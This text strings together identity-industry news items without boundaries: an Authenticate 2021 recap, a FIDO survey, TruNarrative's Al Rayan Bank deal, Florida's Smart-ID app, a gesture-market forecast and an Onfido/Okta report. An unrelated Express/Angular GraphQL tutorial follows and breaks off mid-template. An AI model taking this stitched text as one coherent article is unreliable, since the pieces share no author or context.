 This article is a guest-contribution by identity industry expert Darrell Geusz, Senior Product Manager, <a href="https://www.pingidentity.com/">Ping Identity</a> 



 Highlights and Trend-Setter Standouts 



<p><a href="https://authenticatecon.com/">The Authenticate 2021 conference</a>, only in its second year, has wrapped and the plenary sessions for standards body work under <a href="https://fidoalliance.org/">the FIDO Alliance</a> are underway. The obvious questions that came to mind for the conference, especially given it was a conference started during a pandemic: How well was it attended? Were there any trend-setting end-user organizations that presented? Were there any new products, technologies or use cases that were featured? The short answers are: well, yes, and yes!</p>



<p>In-person attendance reached approximately 250 attendees, with good safety measures in place. No doubt we had to quickly get over the surreal nature of networking among security and identity experts while donning masks – symbology frequently used in the industry to represent the hackers!&nbsp;Virtual attendance was more than three-times the in-person numbers, and the tech and orchestration of the virtual speakers was very smooth.&nbsp;Considering the conference got its start only last year during a pandemic, the numbers are not bad at all. Some standout presentations are highlighted here:</p>



 



  



<p><a href="https://www.linkedin.com/in/davekleidermacher/">Dave Kleidermacher</a>, VP of Engineering for Android Security &amp; Privacy for Google, presented four solutions for key challenges of digital safety for users. Kleidermacher sees a day when each user retains exclusive access to their private information processed by systems and services so that no one unauthorized has access to the plain-text information, not even the service providers (Private Computing). Safety in public content platforms would be ensured via ‘Radical Curation’ where subject matter experts will review apps (that opt in) related to their space to ensure ‘good nutrition’ (e.g. teachers reviewing apps for kids). Transparency regarding the security and privacy ‘ingredients’ inside of products via certification labels that would ‘raise the tide’ so users know how the apps and devices are protecting them.</p>



<p>And finally, and most exciting to this geeky nerd, Kleidermacher emphasized how digital ID wallets on smartphones, tablets, laptops and other devices can bring easy to use and strong access to websites, applications and IoT devices. Kleidermacher called this the “miracle of unphishable authentication” and reinforced that FIDO passkeys will be available in Google’s digital wallet, including APIs for developers, linked to or in addition to government and other ID types.</p>



 



  



<p><a href="https://www.linkedin.com/in/anandbahety/">Anand Bahety</a>, Software Engineering Manager at eBay, presented a sobering and refreshing view on the challenges of implementing FIDO within a production environment. Many presenters would gloss-over these challenges. Instead, Bahety helped the audience understand how to approach these challenges head-on and mitigate them before going live. Bahety also revealed key gaps in the FIDO specification that need to be addressed through updated specifications in the future, including key APIs that should exist but don’t, and the inability for a user to register using the same device with the same single service provider (relying party) across various applications or websites. Today, using FIDO, you have to re-register for each and every app or website that the relying party hosts.</p>



 



  



<p><a href="https://www.linkedin.com/in/itai-zach/">Itai Zach</a>, Senior Product Specialist, and Anthony Bahor, Customer Success Manager, from Ping Identity reminded the audience that implementing passwordless within an enterprise or for customers can bring major benefits if it is treated as a “journey” rather than just a program or project.&nbsp;Zach gave a very logical high-level walkthrough of the journey template to succeed in passwordless deployments. Bahor followed up by providing first-hand experience in the details when planning and executing each step along the way. The nuances of how to avoid obstacles and glide over the speedbumps during activities along the journey to get to a passwordless experience were very helpful. There is no doubt taking these experience-based recommendations when it comes to FIDO and implementing passwordless will make life a lot easier.</p>



 



  



<p><a href="https://www.linkedin.com/in/tom-sheffield/">Tom Sheffield</a>, Senior Director of Cybersecurity at Target, gave us an impressive overview of how FIDO was rolled out for the the company’s workforce. Amazingly, Target discovered how important creating an internal brand and related iconography was to help educate users and drive adoption. Target also learned that trying to force adoption, including mandating a particular FIDO authenticator for all users (e.g. a particular hardware device or methodology), would not work in their environment.&nbsp;Users had to be convinced to opt in on their own and had to be afforded flexibility for their specific work environment and habits.&nbsp;Some excellent program metrics were also presented by Target, including how and when to measure each metric, useful to anyone implementing passwordless for their workforce. Very impressive indeed to see a giant like Target working smart deploying FIDO throughout their ecosystem.</p>



 



  



<p><a href="https://www.linkedin.com/in/kaylashapiro/">Kayla Shapiro</a>, Production Engineer from Facebook, highlighted the work her team did building an end-to-end trusted environment for employees that also incorporates FIDO. Shapiro masterfully delivered understandable and meaningful content around topics like “key exfiltration” and components like “Merkle trees.” Shapiro artfully presented these aspects in the context of identity (as opposed to generic PKI or blockchain, as is typically the case). It was also clear to the audience how these aspects discriminate the solution presented. Shapiro mentioned their work is being considered for OpenSource availability – something to definitely keep an eye out for.</p>



 



<p>These kinds of presentations certainly were refreshing, as compared to only listening to how a standard workflow happens or has been improved.&nbsp;Highlighting concrete information regarding real-world implementations of FIDO, including metrics, really builds confidence that the FIDO standard has come into its own and is ready for primetime. Organizations looking for the “miracle of unphishable authentication” to strengthen their security posture, while simultaneously improving the user experience, should consider FIDO to get things started. It’s clear the next step is for those same organizations to demand that FIDO be combined with the strong root-of-trust incorporated in <a href="https://mobileidworld.com/apple-confirms-tsa-state-participation-in-mobile-id-initiative-809011/">mobile IDs and driver licenses now being provisioned by government issuers and being inserted in various wallets</a>. This combination has a real chance to truly digitize and revolutionize how we engage daily with in-person, online and IoT systems and applications, and then yes, maybe… just maybe… the password will be dead.&nbsp;</p>



<p>We can’t wait to attend next year’s Authenticate conference, when hopefully someone will be showcasing this exact combination! Until then, we are pleased to see <a href="https://fidoalliance.org/identity-verification-binding/">FIDO stepping up to the table to begin independent lab testing of ID verification vendors</a> starting early next year (i.e. UX/UI and image quality assurance and back-engine ML/AI processing for physical government ID authentication and selfie-to-ID photo matching with liveness). This will be very helpful as a stopgap until mobile IDs become more ubiquitous across jurisdictions.</p>



<p>We would be remiss not to also mention the important key activities sponsored by <a href="https://openid.net/foundation/">the OpenID Foundation (OIDF)</a> that happened the same week as Authenticate 2021 to offer FIDO Alliance member engagement to participate in:</p>



  <a href="https://openid.net/2021/09/20/global-assured-identity-network-white-paper/">Global Assured Identity Network (GAIN)</a> – An initiative kicked off by a white paper with 150 authors of a white paper focused on a common-sense approach that addresses the challenge of international interoperability of digital identity. An overview of the program and planned proof of concept was presented and invitation to FIDO Alliance members to collaborate and participate.  Interconnecting Mobile Driver Licenses and OIDF Protocols with FIDO – Established standards (e.g. <a href="https://www.iso.org/standard/69084.html">ISO 18013-5</a> and <a href="https://openid.net/specs/openid-connect-self-issued-v2-1_0.html">Open ID Connect SIOP</a>), and standards in development like <a href="https://www.iso.org/standard/82772.html">ISO 18013-7</a> and workgroup effort under <a href="https://www.iso.org/standard/74910.html">ISO 23220</a>, can benefit greatly by considering or interconnecting complementary FIDO standards to enable safer and more secure online experiences that need to take advantage of the mobile driver license data and root-of-trust.  <a href="https://openid.net/2021/08/24/shared-signals-an-open-standard-for-webhooks/">Shared Signals and Events Framework (SSE)</a> – OIDF recently launched a new standard that is designed to fight fraud, securely and privately, through the sharing of security events, state changes, and other signals between related and/or dependent systems. By standardizing how organizations share various fraud, risk and identity proofing / vetting signals, along with built-in access control mechanisms and additional FIDO standards, the number of errors and omissions would be reduced, consent and approval can be realized, and dealing with exceptions becomes a lot easier and faster.  



<p>These sessions were icing on the cake for the week. All-in-all, Authenticate 2021 packed a good punch of industry progress backed up with real-world results and metrics, topped off with a glimpse of the future where things can go when mashing up key standards.&nbsp;I look forward to what’s in store at Authenticate 2022!</p>

<p><a href="https://fidoalliance.org/">The FIDO Alliance</a> has launched a new <a href="https://fidoalliance.org/online-authentication-barometer/">Online Authentication Barometer</a> to better understand what the world thinks about different authentication methods. The initial barometer is based on the feedback of 10,000 consumers in 10 countries all over the world, and will be updated in the future to track changes in people’s attitudes over time.</p>



  



<p>In that regard, FIDO believes that people will show a greater interest in biometric authentication as they become more familiar with the technology. However, passwords remain the method of choice at the current moment. That’s especially true in financial services, where more than half (56 percent) of the respondents had accessed an account with a password sometime in the past two months. Meanwhile, a full 19 percent of the public still believe that passwords are the strongest security method available online (despite the <a href="https://findbiometrics.com/forgerock-breaches-involving-passwords-shot-up-450-percent-061401/">considerable evidence to the contrary</a>).</p>



<p>Thankfully, there is evidence that suggests that those perspectives are shifting. Eighty-four percent of the public have taken steps to strengthen the security of their online accounts, indicating that most people are at least aware that passwords alone are not a sufficient security method. Biometrics (regardless of modality) are now the second most popular form of authentication, and were used by 35 percent of the respondents.</p>



<p>The shift toward biometrics reflects the fact that people are starting to place more trust in the technology. Just under a third (32 percent) regard biometrics as the strongest authentication method, while 28 percent would prefer to use biometrics over another form of verification. The overall trend was consistent for all 10 countries captured in the survey.</p>



<p>FIDO went on to suggest that <a href="https://mobileidworld.com/how-biometric-tech-can-save-kids-from-password-perils-091401/">education may be the best way to reach out</a> to those who are still clinging to passwords. Of those who had not updated their security practices, 37 percent indicated that they did not know what steps to take, while 26 percent said that the process was too complicated. The increased support for passwordless technologies amongst <a href="https://mobileidworld.com/apple-unveils-new-passwordless-authentication-feature-061405/">tech giants like Apple</a> and <a href="https://mobileidworld.com/windows-hello-biometric-authentication-now-supported-chrome-052601/">Microsoft</a> is expected to help normalize alternative authentication methods.</p>



<p>The first Online Authentication Barometer survey was conducted in September, and captures the responses of consumers in the UK,&nbsp;France,&nbsp;Germany, Australia,&nbsp;Singapore,&nbsp;Japan,&nbsp;South Korea,&nbsp;India,&nbsp;China, and the United States. The Alliance’s <a href="https://mobileidworld.com/fido-releases-authenticate-2021-agenda-081702/">first in-person Authenticate conference</a>, meanwhile, is taking place this week in Seattle, Washington.</p>

<p>Another financial institution is turning to <a href="https://trunarrative.com/">TruNarrative</a> for customer onboarding and risk screening. The company’s latest customer is Al Rayan Bank, which was founded in 2004 and remains the oldest and largest Islamic bank in the United Kingdom.</p>



  



<p>The TruNarrative partnership is in keeping with the bank’s broader digital transformation efforts. Al Rayan will integrate TruNarrative’s technology into its existing tech stack and its digital banking app to enable remote onboarding for businesses and individual customers. TruNarrative will also provide ongoing monitoring services to watch for potential signs of fraud.</p>



<p>On the onboarding front, the TruNarrative platform offers both face and <a href="https://mobileidworld.com/trustid-provides-document-review-services-trunarrative-customers-011202/">document recognition</a>. Each user’s personal information will be cross-referenced with various third-party databases to make sure that the data is accurate, and to ensure that the user is not facing any sanctions and is not on any lists of politically exposed persons. Facial recognition, meanwhile, will match a selfie to official ID to ensure that that person is indeed the true owner of the identity document.</p>



<p>TruNarrative will then assign a risk score to each transaction after the account has been opened. The company will watch for anomalous behavior that could point to the presence of a fraudster, which in turn will help prevent fraud and other forms of financial crime. The solution will help Al Rayan comply with Know Your Customer and Anti-Money Laundering requirements. Al Rayan will also benefit from TruNarrative’s centralized case management tools, and from its integration with the UK’s Cifas fraud database, which will speed up fraud investigations.</p>



<p>“[TruNarrative’s] technology means that we do not have to piece together this part of our tech stack from multiple different suppliers, giving us end to end onboarding and fin-crime in one place with full audit trail and reporting,” said Al Rayan COO Imran Pasha.</p>



<p>The deal builds on TruNarrative’s strong customer base in the UK. The company is already providing onboarding and fraud prevention services for the <a href="https://findbiometrics.com/trunarrative-provides-onboarding-risk-management-services-moneemint-061507/">banking start-up MoneeMint</a>, the <a href="https://mobileidworld.com/the-tote-partners-with-trunarrative-make-sure-gamblers-can-afford-play-032405/">gambling platform The Tote</a>, and for the <a href="https://findbiometrics.com/trunarrative-provides-onboarding-tech-iedigital-072705/">RegTech firm ieDigital</a>.&nbsp;&nbsp;</p>

 “…the Florida Smart-ID app will not function in exactly the same way as Apple’s mobile ID.” 



  



<p>Florida can be added to the list of states working with Apple on a mobile, virtual ID solution.</p>



<p>The news, first reported by <a href="https://floridapolitics.com/archives/464142-digital-drivers-licenses-and-ids-ready-for-public-download-next-month/">Florida Politics</a>, came by way of a state Senate panel last week, at which representatives of the Florida Department of Highway Safety and Motor Vehicles (FLHSMV) confirmed the Apple collaboration.</p>



<p>The official acknowledged that Florida hadn’t been on the list of <a href="https://mobileidworld.com/apple-confirms-tsa-state-participation-in-mobile-id-initiative-809011/">states officially working with Apple</a> when the tech giant offered an update on its mobile ID efforts at the end of summer. At the time, the list included Arizona, Connecticut, Georgia, Iowa, Kentucky, Maryland, Oklahoma, and Utah. </p>



<p>Terrence Samuel, Motorist Modernization Director at the FLHSMV, reportedly expressed surprise that Florida hadn’t been included on the list. But the explanation may lie in the fact that Florida’s mobile ID efforts were not being led by Apple. Rather, the state has been working on its own digital driver’s license system since 2014, and is now preparing to launch its Florida Smart-ID app – on iOS and Android – in mid-November. The FLHSMV had been presenting to the state Senate on that effort generally, rather than on the Apple Mobile ID program in particular.</p>



<p>As described in the Florida Politics report, the Florida Smart-ID app will not function in exactly the same way as Apple’s mobile ID. While the latter appears to communicate ID holder data via NFC, Florida Smart-ID will require the ID holder to scan a QR code from any official asking to see ID (such as a law enforcement officer), and will then bounce the request to a third party server to retrieve the information needed.</p>



<p>However, like Apple’s mobile ID, the Florida Smart-ID app will share information selectively, based on the context and the requesting party. A clerk asking for proof of age at a store will not be sent the same biographic information as a police officer, for example.</p>



<p>It isn’t yet clear whether the Florida Smart-ID app will have a similar identity confirmation process as that of Apple’s mobile ID, which will require users to submit selfie videos in which they perform specified face and head movements during the onboarding process. Apple will use facial recognition to match end users to images of their photo IDs.</p>



<p>In any case, the FLHSMV appears keen to work with Apple to get Florida’s mobile ID integrated into the Apple Wallet, with Samuel having told the Senate panel that there is “nothing that we see that would prevent us from being on the list” of Apple mobile ID partners.</p>



<p>Whether Florida’s app is adapted into Apple’s mobile ID platform or not, the state’s plans for an imminent launch of a mobile ID system reflect growing enthusiasm over the technology, with the government of Ontario – Canada’s most populous province – also currently working on <a href="https://mobileidworld.com/ontario-government-aims-to-launch-mobile-id-by-years-end-809242/">its own mobile ID solution</a>, as another example.</p>

<p><a href="https://www.marketsandmarkets.com/">MarketsandMarkets</a> is anticipating major growth in the <a href="https://www.marketsandmarkets.com/Market-Reports/touchless-sensing-gesturing-market-369.html">Gesture Recognition and Touchless Sensing Market</a>. The firm believes that the market will nearly triple in the next few years, jumping from $13.6 billion in 2021 to $37.6 billion in 2026. Those numbers correspond to a CAGR of 22.6 percent.</p>



  



<p>According to MarketsandMarkets, the demand for touchless technologies will outpace the demand for touch-based gesture recognition solutions. That trend reflects the impact of COVID-19, which has made people more aware of the health risks associated with devices that require physical contact. <a href="https://mobileidworld.com/cerence-brings-gesture-recognition-windshield-ces-011007/">Touchless user interfaces</a> are expected to be <a href="https://mobileidworld.com/amr-forecasts-4-3-billion-automotive-gesture-recognition-market-092902/">particularly popular in the next generation of smart vehicles</a>, where they can help people navigate menus more quickly, and without taking their eyes off the road.</p>



<p>Touch-based gesture recognition technologies will still turn up in consumer electronic devices such as gaming systems, due in large part to their low cost and ease of integration. North America will be the biggest market for gesture recognition tech, though the Asia Pacific region will display a higher CAGR. Countries like China, India, South Korea, and Japan are using gesture recognition in government-backed smart city projects, while consumers have expressed interest in devices (such as TVs and smartphones) with gesture recognition capabilities.</p>



<p>The growing demand for touchless technologies in the APAC region will coincide with a growing demand for biometric technologies more generally. Biometric tech can improve security, while touchless tech will help meet the demand for more hygienic solutions.</p>



<p>MarketsandMarkets listed HID Global, Infineon, Cognitec, and iProov as some of the biggets players in the gesture recognition space, placing them alongside perennial tech titans like Microsoft, Qualcomm, Apple, and Google. The numbers are in keeping with <a href="https://findbiometrics.com/smart-cars-expected-drive-32-3-billion-gesture-recognition-market-040308/">the firm’s 2020 report on the gesture recognition market</a>, which predicted a $32.3 billion market for 2025. Valuates similarly <a href="https://findbiometrics.com/valuates-forecasts-34-3-billion-gesture-recognition-market-052505/">expects the market to reach $34.3 billion</a> in the same time frame.</p>

<p><a href="https://onfido.com/">Onfido</a> and <a href="https://www.okta.com/">Okta</a> have released a new report that suggests that companies are now racing against the clock when they try to onboard new customers online. The report found that while people are more comfortable using online services, they expect the onboarding process to take less than 10 minutes, and will lose confidence in businesses that exceed that time.</p>



  



<p>The findings in the <a href="https://onfido.com/landing/digital-by-default-report/?utm_source=external&amp;utm_medium=press&amp;utm_campaign=okta-report-2021">Digital by Default</a> report are based on the responses of over 1,000 people in France, and another 4,000 people in the US, the UK, and the Netherlands. The survey itself was conducted in September of 2021.</p>



<p>Digging into the details, French consumers were the most enthusiastic about digital services, with the overwhelming majority (94 percent) indicating that they feel comfortable when accessing things online. Many (43 percent) said that their comfort level increased during the pandemic, which suggests that people become more receptive to digital services the more that they have to use them. In that regard, COVID-19 led to <a href="https://findbiometrics.com/entrust-survey-shows-growing-support-hybrid-work-model-wake-covid-19-090107/">increased adoption of digital services</a> as people turned to remote service options during pandemic lockdowns.</p>



<p>The French respondents cited convenience as the biggest advantage that online channels have over their in-person counterparts. The majority (64 percent) appreciated the fact that they didn’t have to leave their home, while nearly half (44 percent) liked the fact that many online services are available 24/7. Many (48 percent) also felt that online services were safer than physical venues during the pandemic.</p>



<p>On the security front, 70 percent of the respondents expressed a <a href="https://findbiometrics.com/duo-tracks-rise-biometrics-latest-trusted-access-report-101803/">willingness to use biometric authentication</a> instead of a password. Meanwhile, 85 percent of those who have already used a biometric to open an account would be willing to do so a second time.</p>



<p>The trend was true across industries and countries, though consumers are particularly keen to use the internet while banking, when booking hotels, and when accessing telecom accounts. Seventy-eight percent of those in France want to be able to open an account in less than 10 minutes, regardless of the nature of that service.</p>



<p>“From the moment a consumer visits a service provider’s website or downloads an app, they’re evaluating whether the business can deliver a trusted digital service, providing security and keeping their data private,” said&nbsp;Onfido CEO Mike Tuchen. “Those that can offer low or zero friction during verification and authentication will positively differentiate themselves in a market where digital services have become the norm.”</p>



<p>Onfido itself has <a href="https://findbiometrics.com/onfido-breaks-revenue-record-again-in-q2-update-707273/">enjoyed record growth</a> during the pandemic, a fact that reflects the rising <a href="https://findbiometrics.com/remote-identity-verification-market-goode-intelligence-710143/">demand for secure remote onboarding technology</a>. <a href="https://mobileidworld.com/tiger-brokers-singapore-chooses-onfido-digital-onboarding-78202105/">Tiger Brokers</a> and the <a href="https://findbiometrics.com/onfido-provides-remote-onboarding-expanding-bux-investment-platform-090301/">BUX investment platform</a> are some of the company’s most recent customers.</p>

  <p>Over the past five years, GraphQL has established itself as the most popular alternative to REST APIs. GraphQL has several advantages over traditional REST-based services. First of all, GraphQL makes the query schema available to the clients. A client that reads the schema immediately knows what services are available on the server. On top of that, the client is able to perform a query on a subset of the data.</p>

<p>Both of these features make the API much more flexible. The server can freely extend the API or make different parts of it available to different clients without breaking any client code. Another major advantage is the ability to perform complex queries. This reduces the number of API calls a client has to perform, and therefore improves performance.</p>

<p>In this tutorial, I will show you how to consume GraphQL in an Angular client. First, I will create a simple GraphQL server using Express. Then I will use the Apollo library to create a service in Angular that connects to the API and performs queries on it. I will implement a simple application that lets you browse the characters of the Star Wars franchise and look up details about their races and home planets. I will not assume any prior knowledge of Express, Angular, or GraphQL. I will assume that you are familiar with JavaScript and Node and have an up-to-date version of the <code>npm</code> package manager installed on your computer.</p>

 Implement a GraphQL server with Express 

<p>In this section, I will show you how to implement the GraphQL server using the Express framework. To start, open your terminal in an empty folder of your choice. This will be the folder that will contain the server project. Inside that folder, run the following command to initialize your Express project.</p>

   <code>npm init -y
</code>   

<p>This will create a <code>package.json</code> in your folder containing the project information and dependencies. Next, you need to install the dependencies required for this project. In your terminal, run the following command.</p>

   <code>npm i -E express@4.17.1 graphql@15.6.1 express-graphql@0.12.0 cors@2.8.5 \
  body-parser@1.19.0 csv-parse@4.16.3
</code>   

<p>To make the server work, you will need some data. I have chosen to keep it simple and use existing CSV data from Kaggle, a machine learning and data science community. Joe Young has put together Star Wars character data from the Fandom Wiki and made it freely available at this link <a href="https://www.kaggle.com/jsphyg/star-wars">https://www.kaggle.com/jsphyg/star-wars</a>. You will need only two files from his collection for this project <code>characters.csv</code> and <code>species.csv</code>. You might have to create a Kaggle account to download the data. Place the files into your project folder.</p>

<p>GraphQL uses a global schema to define the queries allowed on the API and the data they return. Create a file <code>schema.graphql</code> and paste the following contents into it.</p>

   <code>type Query {
  characters(offset: Int = 0, limit: Int = 10): CharactersResult
  character(name: String!): Character
  species(name: String!): Species
}

type CharactersResult {
  count: Int
  characters: [Character]
}

type Character {
  name: String
  height: Int
  mass: String
  hair_color: String
  skin_color: String
  eye_color: String
  birth_year: String
  gender: String
  homeworld: String
  species: String
}

type Species {
  name: String
  classification: String
  designation: String
  average_height: String
  skin_colors: String
  hair_colors: String
  eye_colors: String
  average_lifespan: String
  language: String
  homeworld: String
}
</code>   

<p>The <code>Query</code> type defines the entry point of the schema. It defines three queries: <code>characters</code>, <code>character</code>, and <code>species</code>. The data returned by these queries is defined in separate types in the schema file. Now, create a new file <code>app.js</code>, and fill it with the code below.</p>

   <code>const express = require('express');
const cors = require('cors');
const { json } = require('body-parser');
const fs = require('fs');
const { graphqlHTTP } = require('express-graphql');
const { buildSchema } = require('graphql');
const parse = require('csv-parse/lib/sync');

const app = express()
  .use(cors())
  .use(json());

const schema = buildSchema(fs.readFileSync('schema.graphql', 'utf8'));
const characters = parse(fs.readFileSync('characters.csv', 'utf8'), { columns: true });
const species = parse(fs.readFileSync('species.csv', 'utf8'), { columns: true });

const root = {
  characters: (args) =&gt; {
    return {
      count: characters.length,
      characters: characters.slice(args.offset, args.offset + args.limit)
    };
  },
  character: (args) =&gt; {
    return characters.find((ch) =&gt; ch.name === args.name);
  },
  species: (args) =&gt; {
    return species.find((ch) =&gt; ch.name === args.name);
  },
};

app.use('/graphql', graphqlHTTP({
  schema,
  rootValue: root,
  graphiql: true,
}));

app.listen(4201, (err) =&gt; {
  if (err) {
    return console.log(err);
  }
  return console.log('Server listening on port 4201');
});
</code>   

<p>This is all the code you need to write to create the GraphQL server. The <code>graphqlHTTP</code> middleware registers the handlers on the <code>/graphql</code> route of the express server. The <code>root</code> object defines so-called reducers that will be called whenever a client queries the API. They are responsible for collecting and returning the data.</p>

<p>The nice thing about GraphQL is that you can immediately try it out. In your terminal, run the following command.</p>

   <code>node app.js
</code>   

<p>Now open your browser at <code>http://localhost:4201/graphql</code> and you will be presented with an interactive console.</p>

<p></p>

<p>On the left side, you can try out queries. Give it a go by pasting the following query into the query editor in the browser and pressing the play button at the top.</p>

   <code>{
  characters(offset: 2, limit:3) {
    count
    characters {
      name
      homeworld
      species
    }
  }
  species(name:"Human") {
    classification
    homeworld
  }
}
</code>   

<p>You should see this result on the right side of the screen.</p>

   <code>{
  "data": {
    "characters": {
      "count": 87,
      "characters": [
        {
          "name": "R2-D2",
          "homeworld": "Naboo",
          "species": "Droid"
        },
        {
          "name": "Darth Vader",
          "homeworld": "Tatooine",
          "species": "Human"
        },
        {
          "name": "Leia Organa",
          "homeworld": "Alderaan",
          "species": "Human"
        }
      ]
    },
    "species": {
      "classification": "mammal",
      "homeworld": "Coruscant"
    }
  }
}
</code>   

 Create an Angular GraphQL client 

<p>Angular provides a command-line tool that makes it easy for anybody to set up and maintain an Angular project. The Angular CLI tool can be installed globally using <code>npm</code> by running the following command.</p>

   <code>npm install -g @angular/cli@12.2.10
</code>   

<p>This package provides the global <code>ng</code> command. With this, open the terminal in a folder of your choice and create a new project by running the command below.</p>

   <code>ng new graphql-client --routing --style=css
</code>   

<p>This will create a folder <code>graphql-client</code>, install the Angular framework into it, set up all the necessary toolchains, and create a default application skeleton that you can extend.</p>

<p>The Apollo library offers a convenient GraphQL client. Navigate into the new project folder and add it to the project by running the following command.</p>

   <code>ng add apollo-angular
</code>   

<p>When asked to confirm the installation of the library, answer with <code>y</code>. Next, you will be asked to provide the endpoint URI. Type in <code>http://localhost:4201/graphql</code> and press enter. Now that the basic setup is done, you are ready to create a few components.</p>

<p>Start by creating three components: a <code>Navbar</code> for the page navigation, <code>Home</code> for the home page, and <code>Browse</code>, containing a page to let you browse through the query results. In the terminal, run the following commands.</p>

   <code>ng generate component navbar --module=app
ng generate component home --module=app
ng generate component browse --module=app
</code>   

<p>In an editor of your choice, open <code>src/app/app.component.html</code> and replace its content with the following two lines.</p>

   <code>&lt;app-navbar&gt;&lt;/app-navbar&gt;
&lt;router-outlet&gt;&lt;/router-outlet&gt;
</code>   

<p>There are only two components here. The first will show the navigation bar. The <code>&lt;router-outlet&gt;</code> is a special component in Angular. The Angular router is responsible for reading the navigation URL and deciding which component to show based on the requested path. The <code>&lt;router-outlet&gt;</code> will then show that component.</p>

<p>Next, open <code>src/app/navbar/navbar.component.html</code> and paste the code below into the file.</p>

   <code>&lt;div class="navbar"&gt;
  &lt;div&gt;
    GraphQL Angular App
  &lt;/div&gt;
  &lt;nav&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a routerLink="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a routerLink="/browse"&gt;Browse&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/nav&gt;
&lt;/div&gt;
</code>   

<p>Notice the <code>routerLink</code> properties on the anchor tags. These links are similar to relative links inside regular HTML. But instead of reloading the page, they instruct the router to replace the active component in the <code>router-outlet</code>.</p>

<p>The navigation bar could use some styling. Open <code>src/app/navbar/navbar.component.css</code> and fill in the CSS code below.</p>

   <code>.navbar {
  padding: 8px 16px;
  background-color: #333333;
  color: #ffffff;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

nav ul {
  display: flex;
  list-style: none;
  padding: 0;
}

nav li {
  margin-left: 8px;
  margin-right: 8px;
}

a {
  color: #ffffff;
  text-decoration: none;
}
</code>   

<p>Now, update the <code>Home</code> component by pasting the following line into <code>src/app/home/hone.component.html</code>.</p>

   <code>&lt;h1&gt;Consuming GraphQL with Angular&lt;/h1&gt;
</code>   

<p>To style the component, open <code>src/app/home/hone.component.css</code> and add the following code.</p>

   <code>h1 {
  text-align: center;
  margin: 4rem;
}
</code>   

<p>Before you can start work on the <code>Browse</code> component, you need a service class that encapsulates the calls to the GraphQL API. This class is the core part of this application and demonstrates just how easy it is to communicate with the server using GraphQL. Open the terminal in your project folder and run the following command.</p>

   <code>ng generate service characters
</code>   

<p>This will create a new file <code>src/app/characters.service.ts</code>. Open this file in your editor and replace its contents with the code below.</p>

   <code>import { Injectable } from '@angular/core';
import { Apollo, gql, QueryRef } from 'apollo-angular';

export interface Character {
  name: string;
  homeworld: string;
  species: string;
}

export interface CharacterDetail extends Character {
  height: number;
  mass: string;
  hair_color: string;
  skin_color: string;
  eye_color: string;
  birth_year: string;
  gender: string;
}

export interface CharactersResult {
  count: number;
  characters: Character[];
}

export interface Species {
  name: string;
  classification: string;
  designation: string;
  average_height: string;
  skin_colors: string;
  hair_colors: string;
  eye_colors: string;
  average_lifespan: string;
  language: string;
  homeworld: string;
}

@Injectable({
  providedIn: 'root'
})
export class CharactersService {

  private charactersQuery: QueryRef&lt;{characters: CharactersResult}, { offset: number}&gt;;
  private findCharacterQuery: QueryRef&lt;{character: CharacterDetail}, { name: string}&gt;;
  private findSpeciesQuery: QueryRef&lt;{species: Species}, { name: string}&gt;;

  constructor(private apollo: Apollo) { 
    this.charactersQuery = this.apollo.watchQuery({
      query: gql`query characters($offset: Int!) {
        characters(offset: $offset) {
          count
          characters {
            name
            homeworld
            species
          }
        }
      }`
    });

    this.findCharacterQuery = this.apollo.watchQuery({
      query: gql`query character($name: String!) {
        character(name: $name) {
          name
          height
          mass
          hair_color
          skin_color
          eye_color
          birth_year
          gender
          homeworld
          species
        }
      }`
    });

    this.findSpeciesQuery = this.apollo.watchQuery({
      query: gql`query species($name: String!) {
        species(name: $name) {
          name
          classification
          designation
          average_height
          skin_colors
          hair_colors
          eye_colors
          average_lifespan
          language
          homeworld
        }
      }`
    });
  }

  async getCharacters(offset: number): Promise&lt;CharactersResult&gt; {
    const result = await this.charactersQuery.refetch({ offset });
    return result.data.characters;
  }

  async findCharacter(name: string): Promise&lt;CharacterDetail&gt; {
    const result = await this.findCharacterQuery.refetch({ name });
    return result.data.character;
  }

  async findSpecies(name: string): Promise&lt;Species&gt; {
    const result = await this.findSpeciesQuery.refetch({ name });
    return result.data.species;
  }
}
</code>   

<p>This implementation of the service consists of three parts. At the top of the file, I declared the TypeScript types related to this service. Each type represents the result of a query. The second part is the constructor. Here, the Apollo queries are defined. The queries make use of the <code>gql</code> tag to template strings. This tag translates the strings to GraphQL documents. Finally, the member functions of the service make the queries publicly available to components in your application.</p>

<p>The queries are asynchronous and return promises that resolve the query result once a response from the server has been received.</p>

<p>With this, you can now implement the <code>Browse</code> component. Open <code>src/app/browse/browse.component.ts</code> and change its content to match the following code.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { Character, CharactersService } from '../characters.service';

@Component({
  selector: 'app-browse',
  templateUrl: './browse.component.html',
  styleUrls: ['./browse.component.css']
})
export class BrowseComponent implements OnInit {
  offset: number = 0;
  count: number = 0;
  characters: Character[] = [];

  constructor(private charactersService: CharactersService) {}

  async ngOnInit(): Promise&lt;void&gt; {
    await this.updateCharacters();
  }

  async updateCharacters() {
    const result = await this.charactersService.getCharacters(this.offset);
    this.count = result.count;
    this.characters = result.characters;
  }

  showPrevious() {
    return this.offset &gt; 0;
  }

  showNext() {
    return this.offset + 10 &lt; this.count;
  }

  async onPrevious() {
    this.offset -= 10;
    await this.updateCharacters();
  }

  async onNext() {
    this.offset += 10;
    await this.updateCharacters();
  }
}
</code>   

<p>The function <code>updateCharacters()</code> uses the <code>CharactersService</code> to obtain a list of characters from the server. The functions <code>onPrevious()</code> and <code>onNext()</code> are callbacks that can be used to page through the results. Now, open <code>src/app/browse/browse.component.html</code> and copy the following contents into it.</p>

   <code>&lt;div class="browse"&gt;
  &lt;h1&gt;Browse Characters&lt;/h1&gt;
  &lt;table&gt;
    &lt;tr&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Homeworld&lt;/th&gt;
      &lt;th&gt;Species&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr *ngFor="let character of characters"&gt;
      &lt;td&gt;&lt;a [routerLink]="['/character']" [queryParams]="{name: character.name}"&gt;{{character.name}}&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;{{character.homeworld}}&lt;/td&gt;
      &lt;td&gt;&lt;a [routerLink]="['/species']" [queryParams]="{name: character.species}"&gt;{{character.species}}&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
  &lt;div class="pager"&gt;
